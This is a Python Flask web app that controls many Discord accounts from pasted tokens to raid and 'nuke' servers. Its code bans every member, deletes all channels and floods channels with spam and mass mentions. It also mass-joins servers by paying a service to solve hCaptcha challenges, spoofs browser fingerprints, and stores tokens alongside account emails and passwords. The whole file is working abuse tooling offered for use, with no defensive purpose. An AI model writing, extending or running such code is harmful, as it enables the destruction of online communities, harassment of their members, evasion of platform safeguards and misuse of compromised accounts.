import traceback, threading, requests, datetime, asyncio, aiohttp, discord, random, string, base64, json, time
from flask import Flask, request, redirect, render_template
from tokenManager import TokenManager
from capmonster_python import HCaptchaTask

app = Flask(__name__)
app.config['TEMPLATES_AUTO_RELOAD'] = True
app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0

logs = {}
logIdBotClass = {}
stops = []
failedChannels = []
DISCORD_API_BASE_URL= "https://discord.com/api/v9"

async def getInfo():
    
    async with aiohttp.ClientSession() as session:
        info = await discord.utils._get_info(session)
        return info

info = asyncio.run(getInfo())
USER_AGENT = info[0]["browser_user_agent"]
X_SUPER_PROPERTIES = info[1]

class DiscordApis():
    def __init__(self, logId:str, token:str):
        self.logId = logId
        self.token = token
        self.headers, self.cookies = self.generateHeadersAndCookies()
    def generateFingerprint(self):
        headers = {
            "accept": "*/*",
            "accept-Language": "en-US",
            "connection": "keep-alive",
            "referer": "https://discord.com/register",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sec-GPC": "1",
            "user-agent": USER_AGENT,
            "x-super-properties": X_SUPER_PROPERTIES,
            "x-context-properties": "eyJsb2NhdGlvbiI6IlJlZ2lzdGVyIn0=",
            "authorization": "undefined",
            "accept-encoding": "gzip, deflate, br",
            "sec-ch-ua-mobile": "?0"
        }
        res = requests.get("https://discord.com/api/v9/experiments", headers=headers)
        fingerprint = res.json()["fingerprint"]
        return fingerprint
    def generateHeadersAndCookies(self):
        headers = {
            "User-Agent":USER_AGENT,
            "authorization":self.token,
            "x-super-properties":X_SUPER_PROPERTIES,
            "accept":"*/*",
            "accept-language":"ja-JP",
            "connection":"keep-alive",
            "sec-fetch-dest":"empty",
            "sec-fetch-mode":"cors",
            "sec-fetch-site":"same-origin",
            "referer":"https://discord.com/channels/@me",
            "origin": 'https://discord.com',
            "x-debug-options": "bugReporterEnabled",
            "TE":"Trailers",
            "x-debug-options": "bugReporterEnabled",
            "x-discord-locale": "ja-JP",
            "DNT": "1",
            "x-discord-timezone": "Asia/Saigon",
        }
        res = requests.get("https://discord.com/app", headers=headers)
        cookies = res.cookies
        cookiesStr = ""
        for cookie in cookies:
            cookiesStr += f"{cookie.name}={cookie.value};"
        headers["Cookie"] = cookiesStr
        return headers, cookies
    def getUserInfo(self):
        res = requests.get(f"{DISCORD_API_BASE_URL}/users/@me", headers=self.headers)
        return str(res.status_code)[0] == "2", json.loads(res.text)
    def hcaptchaSolver(self, apikey:str, sitekey:str, data:str, siteUrl="https://discord.com"):
        try:
            capmonster = HCaptchaTask(apikey)
            capmonster.set_user_agent(USER_AGENT)
            taskId = capmonster.create_task(siteUrl, sitekey, is_invisible=True, custom_data=data, )
            result = capmonster.join_task_result(taskId)
            return result.get("gRecaptchaResponse")
        except Exception as e:
            logs[self.logId] += f"[-]Captcha Failed - {str(datetime.datetime.now())} {str(e)} JoinGuild Token: "+base64.b64encode(self.getUserInfo()[1]["id"].encode()).decode()+"\n"
            return None
    def joinGuild(self, inviteCode:str, capmonsterApiKey=""):
        res = requests.post(f"{DISCORD_API_BASE_URL}/invites/{inviteCode}", headers=self.headers, cookies=self.cookies)
        if str(res.status_code)[0] == "2":
            logs[self.logId] += f"[+]Success - {str(datetime.datetime.now())} JoinGuild Token: "+base64.b64encode(self.getUserInfo()[1]["id"].encode()).decode()+"\n"
            return True
        elif res.status_code == 400 and "captcha_key" in res.json() and not capmonsterApiKey.replace(" ", "") == "":
            logs[self.logId] += f"[?]Captcha - {str(datetime.datetime.now())} JoinGuild Token: "+base64.b64encode(self.getUserInfo()[1]["id"].encode()).decode()+"\n"
            solverResult = self.hcaptchaSolver(capmonsterApiKey, str(res.json()["captcha_sitekey"]), res.json()["captcha_rqdata"])
            if not solverResult:
                return False
            payload = {
                "captcha_key":solverResult,
                "captcha_rqtoken":res.json()["captcha_rqtoken"]
            }
            res = requests.post(f"{DISCORD_API_BASE_URL}/invites/{inviteCode}", headers=self.headers, json=payload, cookies=self.cookies)
            if str(res.status_code)[0] == "2":
                logs[self.logId] += f"[+]Success - {str(datetime.datetime.now())} JoinGuild Token: "+base64.b64encode(self.getUserInfo()[1]["id"].encode()).decode()+"\n"
                return True
            else:
                logs[self.logId] += f"[-]Failed - {str(datetime.datetime.now())} JoinGuild Token: "+base64.b64encode(self.getUserInfo()[1]["id"].encode()).decode()+f" StatusCode: {res.status_code}\n"
        else:
            logs[self.logId] += f"[-]Failed - {str(datetime.datetime.now())} JoinGuild Token: "+base64.b64encode(self.getUserInfo()[1]["id"].encode()).decode()+f" StatusCode: {res.status_code}\n"
        return False
    def changeGlobalName(self, newName:str, capmonsterApiKey=""):
        res = requests.patch(f"{DISCORD_API_BASE_URL}/users/@me", headers=self.headers, json={"global_name":newName}, cookies=self.cookies)
        if str(res.status_code)[0] == "2":
            logs[self.logId] += f"[+]Success - {str(datetime.datetime.now())} ChangeName Token: "+base64.b64encode(self.getUserInfo()[1]["id"].encode()).decode()+"\n"
            return True
        elif res.status_code == 400 and "captcha_key" in res.json() and not capmonsterApiKey.replace(" ", "") == "":
            logs[self.logId] += f"[?]Captcha - {str(datetime.datetime.now())} ChangeName Token: "+base64.b64encode(self.getUserInfo()[1]["id"].encode()).decode()+"\n"
            solverResult = self.hcaptchaSolver(capmonsterApiKey, str(res.json()["captcha_sitekey"]), res.json()["captcha_rqdata"])
            if not solverResult:
                return False
            payload = {
                "captcha_key":solverResult,
                "captcha_rqtoken":res.json()["captcha_rqtoken"],
                "global_name":newName
            }
            res = requests.patch(f"{DISCORD_API_BASE_URL}/users/@me", headers=self.headers, json=payload, cookies=self.cookies)
            if str(res.status_code)[0] == "2":
                logs[self.logId] += f"[+]Success - {str(datetime.datetime.now())} JoinGuild Token: "+base64.b64encode(self.getUserInfo()[1]["id"].encode()).decode()+"\n"
                return True
            else:
                logs[self.logId] += f"[-]Failed - {str(datetime.datetime.now())} JoinGuild Token: "+base64.b64encode(self.getUserInfo()[1]["id"].encode()).decode()+f" StatusCode: {res.status_code}\n"
        else:
            print(res.text)
            logs[self.logId] += f"[-]Failed - {str(datetime.datetime.now())} ChangeName Token: "+base64.b64encode(self.getUserInfo()[1]["id"].encode()).decode()+f" StatusCode: {res.status_code}\n"
        return False

class DiscordBot(discord.Client):
    def __init__(self, logId:str, token:str, id:int, name:str, latency:int, messages:list[str], option:list, mode:int):
        super().__init__()
        self.logId = logId
        self.token = token
        
        self.id = id
        self.channelName = self.groupName = name
        
        self.nukeLatency = latency
        self.messages = messages
        self.exclusionChannelIds = []
        if mode == 0:
            self.allUserBan, self.allChannelDelete, self.randomMention, self.exclusionChannelIds = option
        elif mode == 2:
            self.inviteCode, self.capmonsterKey = option
        elif mode == 3:
            self.emoji, self.messageId = option
        elif mode == 4:
            self.messageId = option[0]
        elif mode == 6:
            self.newName, self.capmonsterKey = option
        elif mode == 7:
            self.newName = option[0]
        self.mode = mode
    async def banUser(self, user:discord.Member):
        try:
            await user.ban(reason="Fuck Server User")
            logs[self.logId] += "[+]Success"
        except:
            logs[self.logId] += "-- Error --\n"
            logs[self.logId] += "[-]Failed"
        logs[self.logId] += f" - {str(datetime.datetime.now())} BanUser ID:{user.id} Name:{user.name}\n"
    async def deleteChannel(self, channel:discord.abc.GuildChannel):
        try:
            await channel.delete()
            logs[self.logId] += "[+]Success"
        except:
            logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
            logs[self.logId] += "[-]Failed"
        logs[self.logId] += f" - {str(datetime.datetime.now())} DeleteChannel ID:{channel.id} Name:{channel.name}\n"
    async def sendMessage(self, message:str, channel:discord.abc.GuildChannel, latencyMs:float):
        try:
            if not (type(channel) in [discord.TextChannel, discord.VoiceChannel, discord.Thread] and channel.slowmode_delay == 0 and channel.permissions_for(self.guild.get_member(self.user.id)).send_messages) and self.channelName:
                self.exclusionChannelIds.append(str(channel.id))
                return
            if message[0] == "/":
                async for command in channel.slash_commands():
                    print(command)
                    if command.name == message.split(" ")[0][1:]:
                        await command.__call__(channel)
            else:
                await channel.send(message)
            logs[self.logId] += "[+]Success"
        except Exception as e:
            logs[self.logId] += f"[-]Failed {e}"
            try:
                failedChannels.append(channel)
            except:
                pass
        logs[self.logId] += f" - {str(datetime.datetime.now())} SendMessage ID:{channel.id}\n"
        await asyncio.sleep(latencyMs)
    async def banAllUser(self, guild:discord.Guild):
        logs[self.logId] += "---- Start AllUserBan ----\n"
        await asyncio.gather(*(self.banUser(member) for member in guild.members))
        logs[self.logId] += "---- End ----\n\n\n"
    async def deleteAllChannel(self, guild:discord.Guild):
        logs[self.logId] += "---- Start AllChannelDelete ----\n"
        await asyncio.gather(*(self.deleteChannel(channel) for channel in guild.channels))
        logs[self.logId] += "---- End ----\n\n\n"
    async def createChannel(self, channelName:str, guild:discord.Guild):
        channelName = channelName+"-"+"".join(random.choice(string.ascii_lowercase) for _ in range(10))
        await guild.create_text_channel(channelName)
    async def oneNuke(self, messages:list[str], guild:discord.Guild, channel:discord.abc.GuildChannel, randomMention:bool, roles:list[discord.Role], members:list[discord.Member]):
        for message in messages:
            if message == "":
                continue
            bMessage = message
            if message == messages[0]:
                bMessage = message+"\n"+"".join(random.choice(string.ascii_lowercase) for _ in range(30))+"\n"
            bMessage = bMessage.replace("!userId!", str(random.choice(guild.members).id))
            if randomMention:
                try:
                    bRoles = roles
                    if len(roles) >= 5:
                        bRoles = random.sample(roles, 5)
                    for role in bRoles:
                        bMessage += f"<@&{role.id}> "
                except:
                    pass
                bMessage += "\n"
                try:
                    bMembers = members
                    if len(members) >= 35:
                        bMembers = random.sample(members, 35)
                    for member in bMembers:
                        bMessage += f"<@{member.id}> "
                except:
                    pass
                bMessage += "\n"
            if message != self.messages[0]:
                bMessage = message
            await self.sendMessage(bMessage, channel, self.latency*0.001)
    async def nuke(self, numberOfExecutions=25):
        logs[self.logId] += f"---- Start Nuke ID:{self.user.id} ----\n"
        try:
            self.guild = None
            if self.channelName:
                self.guild = self.get_guild(self.id)
                if not self.guild:
                    logs[self.logId] += f"Error: The server you entered has not been joined by a bot - ID:{self.user.id}\n"
                    return
            else:
                channel = self.get_channel(self.id)
                if not channel:
                    logs[self.logId] += f"Error: Not Found Channel - ID:{self.user.id}\n"
                    return
                self.guild = channel.guild
            if self.allUserBan:
                await self.banAllUser(self.guild)
            if self.allChannelDelete:
                await self.deleteAllChannel(self.guild)
                await asyncio.gather(*(self.createChannel(self.channelName, self.guild) for _ in range(60)))
            self.channels = list(self.guild.channels)
            thereds = []
            roles = list(self.guild.roles)
            members = self.guild.members
            # exclusion everyone
            roles.remove(self.guild.default_role)
            for _ in range(numberOfExecutions):
                if self.logId in stops:
                    logs.pop(self.logId)
                    return
                logs[self.logId] += f"--- Nuke ID:{self.user.id} ---\n"
                if self.channelName:
                    random.shuffle(self.channels)
                    for channel in self.channels:
                        if str(channel.id) in self.exclusionChannelIds:
                            continue
                        if type(channel) == discord.ForumChannel and not channel in thereds:
                            try:
                                self.exclusionChannelIds.append(str(channel.id))
                                channel = await channel.create_thread(name=self.channelName)
                                thereds.append(channel)
                            except:
                                pass
                        await self.oneNuke(self.messages, self.guild, channel, self.randomMention, roles, members)
                        random.shuffle(self.channels)
                else:
                    for i in range(10):
                        await self.oneNuke(self.messages, self.guild, channel, self.randomMention, roles, members)
        except:
            logs[self.logId] += f"-- Error ID:{self.user.id} --\n"+traceback.format_exc()+"\n"
        logs[self.logId] += f"---- End ID:{self.user.id} ----\n"
    async def on_ready(self):
        logs[self.logId] += f"Start Client - Token:{base64.b64encode(str(self.user.id).encode()).decode()}, ID:{self.user.id}, Name:{self.user.name}\n"
        if self.mode == 0:
            await self.nuke()
        elif self.mode == 1:
            try:
                guild = self.get_guild(self.id)
                await guild.leave()
                logs[self.logId] += f"[+]Success - {str(datetime.datetime.now())} LeaveGuild Token: "+base64.b64encode(str(self.user.id).encode()).decode()+"\n"
            except:
                logs[self.logId] += f"[-]Failed - {str(datetime.datetime.now())} LeaveGuild Token: "+base64.b64encode(str(self.user.id).encode()).decode()+"\n"
        elif self.mode == 2:
            apis = DiscordApis(self.logId, self.token)
            apis.joinGuild(self.inviteCode, self.capmonsterKey)
        elif self.mode == 3:
            try:
                channel = self.get_channel(self.id)
                message = await channel.fetch_message(self.messageId)
                if self.emoji[1].replace(" ", "") == "":
                    await message.add_reaction(self.emoji[0])
                else:
                    await message.add_reaction(self.emoji[1])
                logs[self.logId] += f"[+]Success - {str(datetime.datetime.now())} Reaction Token: "+base64.b64encode(str(self.user.id).encode()).decode()+"\n"
            except:
                logs[self.logId] += f"[-]Failed - {str(datetime.datetime.now())} Reaction Token: "+base64.b64encode(str(self.user.id).encode()).decode()+"\n"
        elif self.mode == 4:
            try:
                channel = self.get_channel(self.id)
                message = await channel.fetch_message(self.messageId)
                for component in message.components:
                    if type(component) == discord.Button:
                        await component.click()
                    elif type(component) == discord.ActionRow:
                        for child in component.children:
                            if type(child) == discord.Button:
                                await child.click()
                logs[self.logId] += f"[+]Success - {str(datetime.datetime.now())} PushButton Token: "+base64.b64encode(str(self.user.id).encode()).decode()+"\n"
            except:
                logs[self.logId] += f"[-]Failed - {str(datetime.datetime.now())} PushButton Token: "+base64.b64encode(str(self.user.id).encode()).decode()+"\n"
        elif self.mode == 5:
            try:
                channel = self.get_channel(self.id)
                async with channel.typing():
                    logs[self.logId] += f"[+]Typing start - {str(datetime.datetime.now())} Token: "+base64.b64encode(str(self.user.id).encode()).decode()+"\n"
                    while not self.logId in stops:
                        await asyncio.sleep(20)
                    logs[self.logId] += f"[=]Typing end - {str(datetime.datetime.now())} Token: "+base64.b64encode(str(self.user.id).encode()).decode()+"\n"
            except:
                logs[self.logId] += f"[-]Failed - {str(datetime.datetime.now())} Typing Token: "+base64.b64encode(str(self.user.id).encode()).decode()+"\n"
        elif self.mode == 6:
            apis = DiscordApis(self.logId, self.token)
            apis.changeGlobalName(self.newName, self.capmonsterKey)
        elif self.mode == 7:
            try:
                guild = self.get_guild(self.id)
                i = guild.get_member(self.user.id)
                await i.edit(nick=self.newName)
                logs[self.logId] += f"[+]Success - {str(datetime.datetime.now())} ChangeNickName Token: "+base64.b64encode(str(self.user.id).encode()).decode()+"\n"
            except:
                logs[self.logId] += f"[-]Failed - {str(datetime.datetime.now())} ChangeNickName Token: "+base64.b64encode(str(self.user.id).encode()).decode()+"\n"
        elif self.mode == 8:
            for guild in self.guilds:
                try:
                    if guild.owner == guild.get_member(self.user.id):
                        await guild.delete()
                        continue
                    await guild.leave()
                    logs[self.logId] += f"[+]Success - {str(datetime.datetime.now())} LeaveGuild Token: "+base64.b64encode(str(self.user.id).encode()).decode()+f" {guild.name}\n"
                except:
                    logs[self.logId] += f"[-]Failed - {str(datetime.datetime.now())} LeaveGuild Token: "+base64.b64encode(str(self.user.id).encode()).decode()+f" {guild.name}\n"
        elif self.mode == 9:
            try:
                status = discord.Status.online
                if self.id == 1:
                    status = discord.Status.offline
                elif self.id == 2:
                    status = discord.Status.idle
                elif self.id == 3:
                    status = discord.Status.dnd
                await self.change_presence(status=status)
                logs[self.logId] += f"[+]Success - {str(datetime.datetime.now())} ChangeStatus Token: "+base64.b64encode(str(self.user.id).encode()).decode()+"\n"
            except:
                print(traceback.format_exc())
                logs[self.logId] += f"[-]Failed - {str(datetime.datetime.now())} ChangeStatus Token: "+base64.b64encode(str(self.user.id).encode()).decode()+"\n"
    async def on_message(self, message):
        if message.author.bot:
            return
    def runBot(self):
        try:
            apis = DiscordApis(self.logId, self.token)
            if not apis.getUserInfo()[0]:
                logs[self.logId] += f"Error: invalid token - {self.token}\n"
                return
            self.run(self.token, reconnect=True)
        except:
            logs[self.logId] += f"Error:\n{traceback.format_exc()}"

@app.route("/getLog", methods=["GET"])
def getLog():
    if request.args.get("id") in logs:
        return render_template("getLog.html", log=logs[request.args.get("id")])
    else:
        return render_template("getLog.html", log="Not found"), 404

@app.route("/stop", methods=["GET"])
def stop():
    logId = request.args.get("id")
    try:
        asyncio.run(logIdBotClass[logId].guild.leave())
    except:
        pass
    stops.append(logId)
    return redirect(request.referrer)

@app.route("/tokenManager", methods=["GET", "POST"])
def tokenManager():
    tokenInfosStr = ""
    manager = TokenManager("TOKEN")
    if request.method == "POST":
        token = request.form["token"]
        email = request.form["email"]
        password = request.form["password"]
        etc = request.form["etc"]
        mode = int(request.form["mode"])
        tokens = request.form["tokens"].split("\r\n")
        if not tokens == [""]:
            for token in tokens:
                manager.addToken(token, "", "", "")
        elif mode == 0:
            manager.addToken(token, email, password, etc)
        elif mode in [3,4]:
            successTokenInfos = []
            failedTokenInfos = []
            for tokenInfo in manager.getTokenInfos():
                apis = DiscordApis("n0nenu11", tokenInfo["token"])
                userInfo = apis.getUserInfo()
                if userInfo[0]:
                    successTokenInfos.append(tokenInfo)
                else:
                    failedTokenInfos.append(tokenInfo)
            tokenInfosStr += "===== Success Tokens =====\n"
            for tokenInfo in successTokenInfos:
                tokenInfosStr += f"""{tokenInfo["token"]}\n"""
            tokenInfosStr += "\n===== Failed Tokens =====\n"
            for tokenInfo in failedTokenInfos:
                tokenInfosStr += f"""{tokenInfo["token"]}\n"""
            tokenInfosStr += "\n"
            if mode == 4:
                for tokenInfo in failedTokenInfos:
                    manager.deleteToken(tokenInfo)
        elif mode == 5:
            for tokenInfo in manager.getTokenInfos():
                manager.deleteToken(tokenInfo)
        else:
            no = int(request.form["no"])
            if mode == 1:
                manager.editToken(no, token, email, password, etc)
            elif mode == 2:
                manager.deleteToken(no)
    manager = TokenManager("TOKEN")
    tokenInfos = manager.getTokenInfos()
    tokensOnlyStr = ""
    tokenInfosStr += "======== Tokens ========\n"
    for tokenInfo in tokenInfos:
        tokensOnlyStr += f"""\\n{tokenInfo["token"]}"""
        tokenInfosStr += f"""{tokenInfo["token"]}\n"""
    tokensOnlyStr = tokensOnlyStr.replace("\\n", "", 1)
    tokenInfosStr += "\n===== Token Infos =====\n"
    for i in range(len(tokenInfos)):
        tokenInfosStr += f"""No. {i}\nToken: {tokenInfos[i]["token"]}\nEmail: {tokenInfos[i]["email"]}\nPassword: {tokenInfos[i]["password"]}\nEtc: {tokenInfos[i]["etc"]}\n\n"""
    return render_template("tokenManager.html", tokenInfos=tokenInfosStr, tokensOnly=tokensOnlyStr)

@app.route("/changeStatus", methods=["GET", "POST"])
def changeStatus():
    if request.method == "POST":
        logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
        logs[logId] = "Start Pman StatusChanger P3G\n\n"
        
        tokens = request.form["tokens"].split("\r\n")
        status = int(request.form["status"])
        
        for token in tokens:
            apis = DiscordApis(logId, token)
            userInfo = apis.getUserInfo()
            if userInfo[0]:
                bot = DiscordBot(logId, token, status, None, None, None, None, 9)
                logIdBotClass[logId] = bot
                botThread = threading.Thread(target=bot.runBot, daemon=True)
                botThread.start()
        return render_template("selfBotChangeStatus.html", logId=logId)
    return render_template("selfBotChangeStatus.html")

@app.route("/changeName", methods=["GET", "POST"])
def changeName():
    if request.method == "POST":
    
        logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
        logs[logId] = "Start Pman ChangeName P7P\n\n"
        
        tokens = request.form["tokens"].split("\r\n")
        newName = request.form["newName"]
        capmonsterApiKey = request.form["capmonsterApiKey"]
        
        for token in tokens:
            apis = DiscordApis(logId, token)
            userInfo = apis.getUserInfo()
            if userInfo[0]:
                logs[logId] += f"""OK Token: {base64.b64encode(str(userInfo[1]["id"]).encode()).decode()}\n"""
                bot = DiscordBot(logId, token, None, None, None, None, [newName, capmonsterApiKey], 6)
                logIdBotClass[logId] = bot
                botThread = threading.Thread(target=bot.runBot, daemon=True)
                botThread.start()
        return render_template("selfBotChangeName.html", logId=logId)
    return render_template("selfBotChangeName.html")

@app.route("/changeNickName", methods=["GET", "POST"])
def changeNickName():
    if request.method == "POST":
    
        logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
        logs[logId] = "Start Pman ChangeNickName P3P\n\n"
        
        tokens = request.form["tokens"].split("\r\n")
        guildId = int(request.form["guildId"])
        newName = request.form["newName"]
        
        for token in tokens:
            apis = DiscordApis(logId, token)
            userInfo = apis.getUserInfo()
            if userInfo[0]:
                logs[logId] += f"""OK Token: {base64.b64encode(str(userInfo[1]["id"]).encode()).decode()}\n"""
                bot = DiscordBot(logId, token, guildId, None, None, None, [newName], 7)
                logIdBotClass[logId] = bot
                botThread = threading.Thread(target=bot.runBot, daemon=True)
                botThread.start()
        return render_template("selfBotChangeNickName.html", logId=logId)
    return render_template("selfBotChangeNickName.html")

@app.route("/joinGuild", methods=["GET", "POST"])
def joinGuild():
    if request.method == "POST":
    
        logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
        logs[logId] = "Start Pman Joiner PPP\n\n"
        
        tokens = request.form["tokens"].split("\r\n")
        guildInviteCode = request.form["guildInviteCode"]
        capmonsterApiKey = request.form["capmonsterApiKey"]
        
        for token in tokens:
            apis = DiscordApis(logId, token)
            userInfo = apis.getUserInfo()
            if userInfo[0]:
                logs[logId] += f"""OK Token: {base64.b64encode(str(userInfo[1]["id"]).encode()).decode()}\n"""
                bot = DiscordBot(logId, token, None, None, None, None, [guildInviteCode, capmonsterApiKey], 2)
                botThread = threading.Thread(target=bot.runBot, daemon=True)
                botThread.start()
            else:
                logs[logId] += f"Error: invalid token - {token}\n"
        return render_template("selfBotJoinGuild.html", logId=logId)
    return render_template("selfBotJoinGuild.html")

@app.route("/leaveGuild", methods=["GET", "POST"])
def leaveGuild():
    if request.method == "POST":
    
        logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
        logs[logId] = "Start Pman Leaver PPP\n\n"
        
        tokens = request.form["tokens"].split("\r\n")
        guildId = int(request.form["guildId"])
        
        for token in tokens:
            apis = DiscordApis(logId, token)
            userInfo = apis.getUserInfo()
            if userInfo[0]:
                logs[logId] += f"""OK Token: {base64.b64encode(str(userInfo[1]["id"]).encode()).decode()}\n"""
                bot = DiscordBot(logId, token, guildId, None, None, None, None, 1)
                logIdBotClass[logId] = bot
                botThread = threading.Thread(target=bot.runBot, daemon=True)
                botThread.start()
            else:
                logs[logId] += f"Error: invalid token - {token}\n"
        return render_template("selfBotLeaveGuild.html", logId=logId)
    return render_template("selfBotLeaveGuild.html")

@app.route("/leaveAllGuild", methods=["GET", "POST"])
def leaveAllGuild():
    if request.method == "POST":
    
        logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
        logs[logId] = "Start Pman AllLeaver P1T\n\n"
        
        tokens = request.form["tokens"].split("\r\n")
        
        for token in tokens:
            apis = DiscordApis(logId, token)
            userInfo = apis.getUserInfo()
            if userInfo[0]:
                logs[logId] += f"""OK Token: {base64.b64encode(str(userInfo[1]["id"]).encode()).decode()}\n"""
                bot = DiscordBot(logId, token, None, None, None, None, None, 8)
                logIdBotClass[logId] = bot
                botThread = threading.Thread(target=bot.runBot, daemon=True)
                botThread.start()
            else:
                logs[logId] += f"Error: invalid token - {token}\n"
        return render_template("selfBotLeaveAllGuild.html", logId=logId)
    return render_template("selfBotLeaveAllGuild.html")

@app.route("/reaction", methods=["GET", "POST"])
def reaction():
    if request.method == "POST":
    
        logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
        logs[logId] = "Start Pman Reaction PwP\n\n"
        
        tokens = request.form["tokens"].split("\r\n")
        channelId = int(request.form["channelId"])
        messageId = int(request.form["messageId"])
        emoji = [request.form['emoji'], request.form['customEmoji']]
        
        for token in tokens:
            bot = DiscordBot(logId, token, channelId, None, None, None, [emoji, messageId], 3)
            logIdBotClass[logId] = bot
            botThread = threading.Thread(target=bot.runBot, daemon=True)
            botThread.start()
        return render_template("selfBotReaction.html", logId=logId)
    return render_template("selfBotReaction.html")

@app.route("/pushButton", methods=["GET", "POST"])
def pushButton():
    if request.method == "POST":
    
        logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
        logs[logId] = "Start Pman PushButton PeP\n\n"
        
        tokens = request.form["tokens"].split("\r\n")
        channelId = int(request.form["channelId"])
        messageId = int(request.form["messageId"])
        
        for token in tokens:
            bot = DiscordBot(logId, token, channelId, None, None, None, [messageId], 4)
            logIdBotClass[logId] = bot
            botThread = threading.Thread(target=bot.runBot, daemon=True)
            botThread.start()
        return render_template("selfBotPushButton.html", logId=logId)
    return render_template("selfBotPushButton.html")

@app.route("/typing", methods=["GET", "POST"])
def typing():
    if request.method == "POST":
    
        logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
        logs[logId] = "Start Pman Typer PzP\n\n"
        
        tokens = request.form["tokens"].split("\r\n")
        channelId = int(request.form["channelId"])
        
        for token in tokens:
            bot = DiscordBot(logId, token, channelId, None, None, None, None, 5)
            logIdBotClass[logId] = bot
            botThread = threading.Thread(target=bot.runBot, daemon=True)
            botThread.start()
        return render_template("selfBotTyping.html", logId=logId)
    return render_template("selfBotTyping.html")


@app.route("/channelNuke", methods=["GET", "POST"])
def channelNuke():
    if request.method == "POST":
    
        logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
        logs[logId] = "Start Pman ChannelNuke PQP\n\n"
        
        tokens = request.form["tokens"].split("\r\n")
        channelId = int(request.form["channelId"])
        latency = int(request.form["latency"])
        message = request.form["message"]
        subMessages  = request.form["subMessages"].split("\r\n")
        randomMention = "randomMention" in request.form
        
        logs[logId] += f"""-- Value you entered --
ChannelID:{channelId}
Latency:{latency}ms, {latency*0.001}s
message:\n{message}\n
subMessages:{subMessages}
-- Options --
RandomMention:{randomMention}

"""
        
        for token in tokens:
            apis = DiscordApis(logId, token)
            userInfo = apis.getUserInfo()
            if userInfo[0]:
                logs[logId] += f"""OK Token: {base64.b64encode(str(userInfo[1]["id"]).encode()).decode()}\n"""
                bot = DiscordBot(logId, token, channelId, None, latency, [message]+subMessages, [False, False, randomMention, []], 0)
                logIdBotClass[logId] = bot
                botThread = threading.Thread(target=bot.runBot, daemon=True)
                botThread.start()
        return render_template("selfBotChannelNuke.html", logId=logId)
    return render_template("selfBotChannelNuke.html")

@app.route("/nuke", methods=["GET", "POST"])
def nuke():
    if request.method == "POST":
    
        logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
        logs[logId] = "Start Pman Nuke PPP\n\n"
        
        tokens = request.form["tokens"].split("\r\n")
        guildId = int(request.form["guildId"])
        channelName = request.form["channelName"]
        latency = int(request.form["latency"])
        message = request.form["message"]
        subMessages  = request.form["subMessages"].split("\r\n")
        exclusionChannelIds = request.form["exclusionChannelIds"].split(",")
        allUserBan = "allUserBan" in request.form
        allChannelDelete = "allChannelDelete" in request.form
        randomMention = "randomMention" in request.form
        
        logs[logId] += f"""-- Value you entered --
ServerID:{guildId}
ChannelName:{channelName}
Latency:{latency}ms, {latency*0.001}s
message:\n{message}\n
subMessages:{subMessages}
exclusionChannelIDs:{exclusionChannelIds}
-- Options --
AllUserBan:{allUserBan}
AllChannelDelete:{allChannelDelete}
RandomMention:{randomMention}

"""
        
        for token in tokens:
            apis = DiscordApis(logId, token)
            userInfo = apis.getUserInfo()
            if userInfo[0]:
                logs[logId] += f"""OK Token: {base64.b64encode(str(userInfo[1]["id"]).encode()).decode()}\n"""
                bot = DiscordBot(logId, token, guildId, channelName, latency, [message]+subMessages, [allUserBan, allChannelDelete, randomMention, exclusionChannelIds], 0)
                logIdBotClass[logId] = bot
                botThread = threading.Thread(target=bot.runBot, daemon=True)
                botThread.start()
        return render_template("selfBotNuke.html", logId=logId)
    return render_template("selfBotNuke.html")

def main():
    port = 8081
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    main()